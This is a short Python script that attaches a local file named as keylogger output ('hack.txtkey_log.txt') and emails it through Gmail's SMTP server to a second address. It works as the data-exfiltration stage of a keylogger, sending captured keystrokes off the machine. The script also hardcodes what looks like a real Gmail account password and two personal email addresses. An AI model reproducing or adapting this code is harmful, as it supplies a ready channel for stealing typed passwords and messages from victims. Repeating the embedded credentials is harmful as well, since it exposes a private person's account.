import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
autodir=os.getcwd()
print(autodir)

fromaddr = "rittwik.mandal@gmail.com"
toaddr = "ritwikmandal.cs17@bitsathy.ac.in"

msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "SUBJECT check"

body = "YEH body mai print hoga"

msg.attach(MIMEText(body, 'plain'))

filename = "hack.txtkey_log"
attachment = open(autodir+"\hack.txtkey_log.txt", "rb")  #try wothout giving filename here

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr, "**amibanglabhasajani**amarnaamritwikmandal")
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
